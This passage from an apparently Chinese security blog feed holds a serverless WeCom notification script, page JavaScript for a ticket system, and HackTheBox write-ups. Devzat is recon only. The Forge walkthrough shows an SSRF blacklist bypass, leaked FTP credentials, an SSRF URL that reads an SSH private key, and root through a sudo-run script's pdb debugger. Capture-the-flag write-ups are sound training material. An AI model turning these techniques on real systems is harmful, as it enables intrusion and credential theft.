(反正免费白嫖腾讯云函数，还比较稳定)</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token comment"># -*- coding: utf8 -*-</span><span class="token keyword">import</span> json<span class="token punctuation">,</span> base64<span class="token punctuation">,</span> requests<span class="token keyword">import</span> datetime<span class="token keyword">class</span> <span class="token class-name">WeChatPush</span><span class="token punctuation">:</span>    <span class="token triple-quoted-string string">'''企业微信推送'''</span>    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> corpid<span class="token punctuation">,</span> agentid<span class="token punctuation">,</span> corpsecret<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token comment"># 企业ID</span>        self<span class="token punctuation">.</span>corpid <span class="token operator">=</span> corpid        <span class="token comment"># 企业应用ID</span>        self<span class="token punctuation">.</span>agentid <span class="token operator">=</span> agentid        <span class="token comment"># 应用的凭证密钥</span>        self<span class="token punctuation">.</span>corpsecret <span class="token operator">=</span> corpsecret        <span class="token comment"># access_token</span>        self<span class="token punctuation">.</span>access_token <span class="token operator">=</span> <span class="token string">''</span>        <span class="token comment"># access_token 获取调用接口</span>        self<span class="token punctuation">.</span>token_url <span class="token operator">=</span> <span class="token string">'https://qyapi.weixin.qq.com/cgi-bin/gettoken?'</span>        <span class="token comment"># 应用消息发送接口</span>        self<span class="token punctuation">.</span>send_url <span class="token operator">=</span> <span class="token string">'https://qyapi.weixin.qq.com/cgi-bin/message/send?access_token='</span>        <span class="token comment"># 请求 session</span>        self<span class="token punctuation">.</span>sess <span class="token operator">=</span> requests<span class="token punctuation">.</span>Session<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">def</span> <span class="token function">get_token</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token triple-quoted-string string">'''获取 access_token'''</span>        res <span class="token operator">=</span> json<span class="token punctuation">.</span>loads<span class="token punctuation">(</span>            self<span class="token punctuation">.</span>sess<span class="token punctuation">.</span>get<span class="token punctuation">(</span>self<span class="token punctuation">.</span>token_url <span class="token operator">+</span> <span class="token string">'corpid='</span> <span class="token operator">+</span> self<span class="token punctuation">.</span>corpid <span class="token operator">+</span> <span class="token string">'&amp;corpsecret='</span> <span class="token operator">+</span> self<span class="token punctuation">.</span>corpsecret<span class="token punctuation">)</span><span class="token punctuation">.</span>text<span class="token punctuation">)</span>        <span class="token keyword">if</span> res<span class="token punctuation">[</span><span class="token string">'errcode'</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">:</span>            <span class="token keyword">return</span> res<span class="token punctuation">[</span><span class="token string">'errcode'</span><span class="token punctuation">]</span>        self<span class="token punctuation">.</span>access_token <span class="token operator">=</span> res<span class="token punctuation">[</span><span class="token string">'access_token'</span><span class="token punctuation">]</span>        <span class="token keyword">return</span> <span class="token number">0</span>    <span class="token keyword">def</span> <span class="token function">send</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> content<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">,</span> user<span class="token operator">=</span><span class="token string">'@all'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token triple-quoted-string string">'''应用消息发送'''</span>        <span class="token keyword">if</span> self<span class="token punctuation">.</span>access_token <span class="token operator">==</span> <span class="token string">''</span><span class="token punctuation">:</span>            res_get <span class="token operator">=</span> self<span class="token punctuation">.</span>get_token<span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token comment"># 更新 access_token</span>            <span class="token keyword">if</span> res_get <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">:</span>                <span class="token keyword">return</span> res_get        data <span class="token operator">=</span> <span class="token punctuation">{</span>            <span class="token string">'touser'</span><span class="token punctuation">:</span> user<span class="token punctuation">,</span>            <span class="token string">'toparty'</span><span class="token punctuation">:</span> <span class="token string">'@all'</span><span class="token punctuation">,</span>            <span class="token string">'totag'</span><span class="token punctuation">:</span> <span class="token string">'@all'</span><span class="token punctuation">,</span>            <span class="token string">'msgtype'</span><span class="token punctuation">:</span> <span class="token string">'text'</span><span class="token punctuation">,</span>            <span class="token string">'agentid'</span><span class="token punctuation">:</span> self<span class="token punctuation">.</span>agentid<span class="token punctuation">,</span>            <span class="token string">'text'</span><span class="token punctuation">:</span> <span class="token punctuation">{</span>                <span class="token string">'content'</span><span class="token punctuation">:</span> content<span class="token punctuation">,</span>            <span class="token punctuation">}</span><span class="token punctuation">,</span>            <span class="token string">'safe'</span><span class="token punctuation">:</span> <span class="token number">0</span><span class="token punctuation">,</span>            <span class="token string">'enable_id_trans'</span><span class="token punctuation">:</span> <span class="token number">0</span><span class="token punctuation">,</span>            <span class="token string">'enable_duplicate_check'</span><span class="token punctuation">:</span> <span class="token number">0</span><span class="token punctuation">,</span>            <span class="token string">'duplicate_check_interval'</span><span class="token punctuation">:</span> <span class="token number">1800</span>        <span class="token punctuation">}</span>        res <span class="token operator">=</span> json<span class="token punctuation">.</span>loads<span class="token punctuation">(</span>self<span class="token punctuation">.</span>sess<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token operator">=</span><span class="token punctuation">(</span>self<span class="token punctuation">.</span>send_url <span class="token operator">+</span> self<span class="token punctuation">.</span>access_token<span class="token punctuation">)</span><span class="token punctuation">,</span> data<span class="token operator">=</span>json<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>text<span class="token punctuation">)</span>        <span class="token keyword">if</span> res<span class="token punctuation">[</span><span class="token string">'errcode'</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">:</span>  <span class="token comment"># 可能由 access_token 过期造成</span>            res_get <span class="token operator">=</span> self<span class="token punctuation">.</span>get_token<span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token comment"># 更新 access_token</span>            <span class="token keyword">if</span> res_get <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">:</span>                <span class="token keyword">return</span> res_get            res <span class="token operator">=</span> json<span class="token punctuation">.</span>loads<span class="token punctuation">(</span>self<span class="token punctuation">.</span>sess<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token operator">=</span><span class="token punctuation">(</span>self<span class="token punctuation">.</span>send_url <span class="token operator">+</span> self<span class="token punctuation">.</span>access_token<span class="token punctuation">)</span><span class="token punctuation">,</span> data<span class="token operator">=</span>json<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>text<span class="token punctuation">)</span>            <span class="token keyword">return</span> res<span class="token punctuation">[</span><span class="token string">'errcode'</span><span class="token punctuation">]</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            <span class="token keyword">return</span> <span class="token number">0</span><span class="token keyword">def</span> <span class="token function">main_handler</span><span class="token punctuation">(</span>event<span class="token punctuation">,</span> context<span class="token punctuation">)</span><span class="token punctuation">:</span>    para_data <span class="token operator">=</span> event<span class="token punctuation">[</span><span class="token string">'queryString'</span><span class="token punctuation">]</span>    path <span class="token operator">=</span> event<span class="token punctuation">[</span><span class="token string">'path'</span><span class="token punctuation">]</span>    <span class="token keyword">if</span> path <span class="token operator">!=</span> <span class="token string">"/xxxxx"</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token punctuation">{</span>            <span class="token string">"isBase64Encoded"</span><span class="token punctuation">:</span> <span class="token boolean">False</span><span class="token punctuation">,</span>            <span class="token string">"statusCode"</span><span class="token punctuation">:</span> <span class="token number">200</span><span class="token punctuation">,</span>            <span class="token string">"headers"</span><span class="token punctuation">:</span> <span class="token punctuation">{</span><span class="token string">'Content-Type'</span><span class="token punctuation">:</span> <span class="token string">'application/json'</span><span class="token punctuation">}</span><span class="token punctuation">,</span>            <span class="token string">"body"</span><span class="token punctuation">:</span> json<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span><span class="token punctuation">{</span><span class="token string">'you'</span><span class="token punctuation">:</span> <span class="token string">'bad boy'</span><span class="token punctuation">}</span><span class="token punctuation">)</span>        <span class="token punctuation">}</span>    push <span class="token operator">=</span> WeChatPush<span class="token punctuation">(</span><span class="token string">"xxxx"</span><span class="token punctuation">,</span> <span class="token string">"xxx"</span><span class="token punctuation">,</span> <span class="token string">"xxxx"</span><span class="token punctuation">)</span>    res <span class="token operator">=</span> push<span class="token punctuation">.</span>send<span class="token punctuation">(</span>content<span class="token operator">=</span>  <span class="token punctuation">(</span>datetime<span class="token punctuation">.</span>datetime<span class="token punctuation">.</span>now<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> datetime<span class="token punctuation">.</span>timedelta<span class="token punctuation">(</span>hours<span class="token operator">=</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>strftime<span class="token punctuation">(</span><span class="token string">'%Y-%m-%d %H:%M:%S'</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'\n\n'</span> <span class="token operator">+</span>para_data<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'xxx'</span><span class="token punctuation">)</span><span class="token punctuation">,</span> user<span class="token operator">=</span><span class="token string">"xxxxx"</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> res <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'发送消息成功！'</span><span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'发送消息失败！错误代码:'</span><span class="token punctuation">,</span> res<span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token punctuation">{</span>        <span class="token string">"isBase64Encoded"</span><span class="token punctuation">:</span> <span class="token boolean">False</span><span class="token punctuation">,</span>        <span class="token string">"statusCode"</span><span class="token punctuation">:</span> <span class="token number">200</span><span class="token punctuation">,</span>        <span class="token string">"headers"</span><span class="token punctuation">:</span> <span class="token punctuation">{</span><span class="token string">'Content-Type'</span><span class="token punctuation">:</span> <span class="token string">'application/json'</span><span class="token punctuation">}</span><span class="token punctuation">,</span>        <span class="token string">"body"</span><span class="token punctuation">:</span> json<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span><span class="token punctuation">{</span><span class="token string">'para_data'</span><span class="token punctuation">:</span>  para_data<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'text'</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">'path'</span><span class="token punctuation">:</span> path<span class="token punctuation">}</span><span class="token punctuation">)</span>    <span class="token punctuation">}</span></code></pre><p>这样，页面调用只传入需要发送的消息即可</p><pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">var</span> httpRequest <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">XMLHttpRequest</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>httpRequest<span class="token punctuation">.</span><span class="token function">open</span><span class="token punctuation">(</span><span class="token string">'GET'</span><span class="token punctuation">,</span> <span class="token string">'https://service-xxx'</span><span class="token operator">+</span> <span class="token function">encodeURIComponent</span><span class="token punctuation">(</span>content<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>httpRequest<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>httpRequest<span class="token punctuation">.</span><span class="token function-variable function">onreadystatechange</span> <span class="token operator">=</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token keyword">if</span> <span class="token punctuation">(</span>httpRequest<span class="token punctuation">.</span>readyState <span class="token operator">==</span> <span class="token number">4</span> <span class="token operator">&amp;&amp;</span> httpRequest<span class="token punctuation">.</span>status <span class="token operator">==</span> <span class="token number">200</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token keyword">var</span> json <span class="token operator">=</span> httpRequest<span class="token punctuation">.</span>responseText<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><h2 id="Ticket详情页面"><a href="#Ticket详情页面" class="headerlink" title="Ticket详情页面"></a>Ticket详情页面</h2><p>获取 raw_log</p><pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">var</span> raw_log <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">'field-customfield_10219'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>children<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>children<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>innerText<span class="token punctuation">.</span><span class="token function">trim</span><span class="token punctuation">(</span><span class="token punctuation">)</span>raw_log <span class="token operator">=</span> raw_log<span class="token punctuation">.</span><span class="token function">split</span><span class="token punctuation">(</span><span class="token string">'\n'</span><span class="token punctuation">)</span></code></pre><p>其他一些json数据提取并拼接成指定格式，生成按钮，绑定事件，只贴关键代码</p><pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token comment">//解析 json数据， 外面加个try，防止数据格式不对</span><span class="token keyword">try</span> <span class="token punctuation">{</span><span class="token keyword">var</span> log_obj <span class="token operator">=</span> <span class="token constant">JSON</span><span class="token punctuation">.</span><span class="token function">parse</span><span class="token punctuation">(</span>raw_log<span class="token punctuation">[</span>x<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">}</span> <span class="token keyword">catch</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token keyword">continue</span><span class="token punctuation">}</span><span class="token comment">//生成按钮</span><span class="token keyword">var</span> div_par <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">getElementsByClassName</span><span class="token punctuation">(</span><span class="token string">"aui-toolbar2-primary"</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token keyword">var</span> gener_desc<span class="token operator">=</span>document<span class="token punctuation">.</span><span class="token function">createElement</span><span class="token punctuation">(</span><span class="token string">"div"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>gener_desc<span class="token punctuation">.</span><span class="token function">setAttribute</span><span class="token punctuation">(</span><span class="token string">'class'</span><span class="token punctuation">,</span><span class="token string">"aui-buttons pluggable-ops"</span><span class="token punctuation">)</span>gener_desc<span class="token punctuation">.</span>innerHTML<span class="token operator">=</span><span class="token string">'&lt;a id="gen_describ" onclick="gen_describ" title="Generate description" class="aui-button toolbar-trigger&gt;&lt;span class="icon aui-icon aui-icon-small"&gt;&lt;/span&gt; &lt;span class="trigger-label"&gt;Generate description&lt;/span&gt;&lt;/a&gt;'</span>div_par<span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span>gener_desc<span class="token punctuation">)</span><span class="token comment">//绑定 click事件，其实生成按钮时加一个 onclick 属性也行</span>document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">'gen_describ'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">addEventListener</span><span class="token punctuation">(</span><span class="token string">'click'</span><span class="token punctuation">,</span> gen_describ<span class="token punctuation">,</span> <span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//数组去重后，拼接成字符串</span>tmp <span class="token operator">=</span>  Array<span class="token punctuation">.</span><span class="token function">from</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Set</span><span class="token punctuation">(</span>tmp<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">var</span> des_str <span class="token operator">=</span> tmp<span class="token punctuation">.</span><span class="token function">join</span><span class="token punctuation">(</span><span class="token string">"\n"</span><span class="token punctuation">)</span><span class="token comment">//打开新的链接</span>window<span class="token punctuation">.</span><span class="token function">open</span><span class="token punctuation">(</span><span class="token string">"https://xxxx"</span><span class="token operator">+</span>alert_info<span class="token punctuation">[</span>y<span class="token punctuation">]</span><span class="token punctuation">.</span>alert_id<span class="token punctuation">)</span></code></pre>]]></content>
      
      
      
        <tags>
            
            <tag> javascript </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HackTheBox-Devzat</title>
      <link href="/2021/12/29/hackthebox-devzat/"/>
      <url>/2021/12/29/hackthebox-devzat/</url>
      
        <content type="html"><![CDATA[<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>hostname：Devzat.htb</p><p>ip:10.10.11.118</p><p>Os:linux</p><pre class="language-none"><code class="language-none">echo "10.10.11.118 Devzat.htb" &gt;&gt; /etc/hosts</code></pre><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h3 id="nmap"><a href="#nmap" class="headerlink" title="nmap"></a>nmap</h3><pre class="language-none"><code class="language-none">nmap -sS -A -sC -sV -p- --min-rate 500 10.10.11.118</code></pre><pre class="language-none"><code class="language-none">PORT      STATE    SERVICE VERSION22/tcp    open     ssh     (protocol 2.0)|_ssh-hostkey: ERROR: Script execution failed (use -d to debug)80/tcp    open     http    Apache httpd 2.4.41 ((Ubuntu))|_http-methods: No Allow or Public header in OPTIONS response (status code 302)|_http-title: Did not follow redirect to http://devzat.htb/8000/tcp  open     ssh     (protocol 2.0)|_ssh-hostkey: ERROR: Script execution failed (use -d to debug)</code></pre><h3 id="gobuster"><a href="#gobuster" class="headerlink" title="gobuster"></a>gobuster</h3><p>fuzz dir</p><pre class="language-none"><code class="language-none">gobuster dir -u http://Devzat.htb/ -t 80 -w directory-list-2.3-medium.txt -e </code></pre><h2 id="立足点"><a href="#立足点" class="headerlink" title="立足点"></a>立足点</h2><h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2>]]></content>
      
      
      
        <tags>
            
            <tag> HTB </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HackTheBox-forge</title>
      <link href="/2021/12/28/hackthebox-forge/"/>
      <url>/2021/12/28/hackthebox-forge/</url>
      
        <content type="html"><![CDATA[<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>hostname：Forge.htb</p><p>ip:10.10.11.111</p><p>Os:linux</p><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h3 id="nmap"><a href="#nmap" class="headerlink" title="nmap"></a>nmap</h3><pre class="language-none"><code class="language-none">nmap -sS -A -sC -sV -p- --min-rate 500 10.10.11.111</code></pre><pre class="language-none"><code class="language-none">22/tcp open     ssh     (protocol 2.0)|_ssh-hostkey: ERROR: Script execution failed (use -d to debug)80/tcp open     http    Apache httpd 2.4.41 ((Ubuntu))|_http-methods: No Allow or Public header in OPTIONS response (status code 302)|_http-title: Did not follow redirect to http://forge.htb</code></pre><h3 id="gobuster"><a href="#gobuster" class="headerlink" title="gobuster"></a>gobuster</h3><pre class="language-none"><code class="language-none">gobuster dir -u http://forge.htb/ -t 90 -w directory-list-2.3-medium.txt -e </code></pre><pre class="language-none"><code class="language-none">http://forge.htb/uploads              (Status: 301) [Size: 224] [--&gt; http://forge.htb/uploads/]http://forge.htb/static               (Status: 301) [Size: 307] [--&gt; http://forge.htb/static/] http://forge.htb/upload               (Status: 200) [Size: 929]   </code></pre><p>浏览网站有一个 上传图片页面，未发现明显漏洞，尝试爆破虚拟主机</p><pre class="language-none"><code class="language-none">gobuster vhost -u http://forge.htb/ -w subdomains-top1million-110000.txt -t 100</code></pre><p>爆破出一个 admin.forge.htb 域名，直接访问提示 </p><pre class="language-none"><code class="language-none">Only localhost is allowed!</code></pre><p>尝试插入header <em>X-Forwarded-For</em> 看能否绕过,绕过失败</p><h2 id="攻击阶段"><a href="#攻击阶段" class="headerlink" title="攻击阶段"></a>攻击阶段</h2><h4 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h4><p>突然想起来，上传图片那里，提供传入url 访问，应该是存在 SSRF 漏洞，于是可以利用这个点，尝试访问 admin.forge.htb</p><p><img src="/assets/image-20211229103955674.png" alt="image-20211229103955674"></p><p>直接访问，发现在黑名单，尝试进行绕过,简单大小写混写就能绕过。</p><p><img src="/assets/image-20211229104505614.png" alt="image-20211229104505614"></p><p>访问响应包中的url，即可查看到响应。</p><p>通过ssrf 漏洞浏览网页，在 <a href="http://admin.forge.htb/announcements">http://admin.forGe.Htb/announcements</a> 页面发现了一个 ftp 账号密码</p><pre class="language-none"><code class="language-none">&lt;li&gt;An internal ftp server has been setup with credentials as user:heightofsecurity123!&lt;/li&gt;        &lt;li&gt;The /upload endpoint now supports ftp, ftps, http and https protocols for uploading from url.&lt;/li&gt;        &lt;li&gt;The /upload endpoint has been configured for easy scripting of uploads, and for uploading an image, one can simply pass a url with ?u=&lt;url&gt;.&lt;/li&gt;</code></pre><p>并且 提示支持通过url 参数上传文件 ，使用参数 <code>u</code> </p><p>通过尝试，发现admin的url上传可以使用 ftp/ftps 协议，而外面只能使用 http协议，因此尝试使用 ftp协议读取目录文件</p><p><img src="/assets/image-20211229115805050.png" alt="image-20211229115805050"></p><p>此处可以看到读取到了 user.txt </p><p><img src="/assets/image-20211229115954445.png" alt="image-20211229115954445"></p><h2 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h2><p>测试使用user 账号密码进行ssh登陆时，提示需要使用密钥进行登录。这里我们已经读取到user.txt ,说明当前在用户的家目录，尝试读取私钥。</p><pre class="language-none"><code class="language-none">url=http://admin.forGe.Htb/upload?u=ftp://user:heightofsecurity123!@localHost:21/.ssh/id_rsa&amp;remote=1</code></pre><p><img src="/assets/image-20211229133149814.png" alt="image-20211229133149814"></p><p>然后将私钥替换，进行登录</p><pre class="language-none"><code class="language-none">ssh -i id_a user@10.10.11.111</code></pre><p><img src="/assets/image-20211229133315264.png" alt="image-20211229133315264"></p><p>执行 sudo -l 查看</p><p><img src="/assets/image-20211229135636548.png" alt="image-20211229135636548"></p><p>发现一个可疑脚本，可用sudo 执行，审计该脚本</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token comment">#!/usr/bin/env python3</span><span class="token keyword">import</span> socket<span class="token keyword">import</span> random<span class="token keyword">import</span> subprocess<span class="token keyword">import</span> pdbport <span class="token operator">=</span> random<span class="token punctuation">.</span>randint<span class="token punctuation">(</span><span class="token number">1025</span><span class="token punctuation">,</span> <span class="token number">65535</span><span class="token punctuation">)</span><span class="token keyword">try</span><span class="token punctuation">:</span>    sock <span class="token operator">=</span> socket<span class="token punctuation">.</span>socket<span class="token punctuation">(</span>socket<span class="token punctuation">.</span>AF_INET<span class="token punctuation">,</span> socket<span class="token punctuation">.</span>SOCK_STREAM<span class="token punctuation">)</span>    sock<span class="token punctuation">.</span>setsockopt<span class="token punctuation">(</span>socket<span class="token punctuation">.</span>SOL_SOCKET<span class="token punctuation">,</span> socket<span class="token punctuation">.</span>SO_REUSEADDR<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span>    sock<span class="token punctuation">.</span>bind<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token string">'127.0.0.1'</span><span class="token punctuation">,</span> port<span class="token punctuation">)</span><span class="token punctuation">)</span>    sock<span class="token punctuation">.</span>listen<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'Listening on localhost:</span><span class="token interpolation"><span class="token punctuation">{</span>port<span class="token punctuation">}</span></span><span class="token string">'</span></span><span class="token punctuation">)</span>    <span class="token punctuation">(</span>clientsock<span class="token punctuation">,</span> addr<span class="token punctuation">)</span> <span class="token operator">=</span> sock<span class="token punctuation">.</span>accept<span class="token punctuation">(</span><span class="token punctuation">)</span>    clientsock<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">b'Enter the secret passsword: '</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> clientsock<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">)</span><span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token string">'secretadminpassword'</span><span class="token punctuation">:</span>        clientsock<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">b'Wrong password!\n'</span><span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        clientsock<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">b'Welcome admin!\n'</span><span class="token punctuation">)</span>        <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>            clientsock<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">b'\nWhat do you wanna do: \n'</span><span class="token punctuation">)</span>            clientsock<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">b'[1] View processes\n'</span><span class="token punctuation">)</span>            clientsock<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">b'[2] View free memory\n'</span><span class="token punctuation">)</span>            clientsock<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">b'[3] View listening sockets\n'</span><span class="token punctuation">)</span>            clientsock<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">b'[4] Quit\n'</span><span class="token punctuation">)</span>            option <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>clientsock<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">)</span><span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>            <span class="token keyword">if</span> option <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">:</span>                clientsock<span class="token punctuation">.</span>send<span class="token punctuation">(</span>subprocess<span class="token punctuation">.</span>getoutput<span class="token punctuation">(</span><span class="token string">'ps aux'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>            <span class="token keyword">elif</span> option <span class="token operator">==</span> <span class="token number">2</span><span class="token punctuation">:</span>                clientsock<span class="token punctuation">.</span>send<span class="token punctuation">(</span>subprocess<span class="token punctuation">.</span>getoutput<span class="token punctuation">(</span><span class="token string">'df'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>            <span class="token keyword">elif</span> option <span class="token operator">==</span> <span class="token number">3</span><span class="token punctuation">:</span>                clientsock<span class="token punctuation">.</span>send<span class="token punctuation">(</span>subprocess<span class="token punctuation">.</span>getoutput<span class="token punctuation">(</span><span class="token string">'ss -lnt'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>            <span class="token keyword">elif</span> option <span class="token operator">==</span> <span class="token number">4</span><span class="token punctuation">:</span>                clientsock<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">b'Bye\n'</span><span class="token punctuation">)</span>                <span class="token keyword">break</span><span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span>    pdb<span class="token punctuation">.</span>post_mortem<span class="token punctuation">(</span>e<span class="token punctuation">.</span>__traceback__<span class="token punctuation">)</span><span class="token keyword">finally</span><span class="token punctuation">:</span>    quit<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p>这几个命令可疑尝试能否利用环境变量进行替换，但此处 sudo 限制了可执行文件的 PATH 变量，无法使用环境变量提权。</p><h3 id="PDB调试"><a href="#PDB调试" class="headerlink" title="PDB调试"></a>PDB调试</h3><p>观察到脚本引入了一个 模块 pdb，该模块会在执行错误时，进入pdb模式，可执行任意 python代码</p><p>尝试执行此脚本，在输入非预期的词时如 ls，会进入 PDB调试模式</p><p>进入pdb模式后，即可执行任意命令，读取 root.txt</p><p><img src="/assets/image-20211229142832956.png" alt="image-20211229142832956"></p>]]></content>
      
      
      
        <tags>
            
            <tag> HTB </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HackTheBox-horizontall</title>
      <link href="/2021/12/27/hackthebox-horizontall/"/>
      <url>/2021/12/27/hackthebox-horizontall/</url>
      
